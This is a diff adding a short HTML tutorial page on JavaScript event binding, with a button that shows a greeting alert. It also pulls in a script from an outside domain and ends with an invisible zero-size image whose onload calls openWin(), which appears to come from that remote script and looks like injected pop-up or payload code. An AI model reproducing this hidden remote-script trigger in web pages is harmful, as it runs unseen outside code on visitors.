@@ -1,0 +1,17 @@
+ <!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+    <head>
+	   <title>javascript中的动态绑定</title>
+	<script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+	<script language="javascript">
+	    function hello(){
+	           alert("您好！");
+			   }
+	</script>
+	<body>
+	  <p><button id="hello_button" name="abutton1">问候</button></p>
+	  <script language="javascript">
+	      hello_button.onclick = hello;
+	   </script>
+	<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
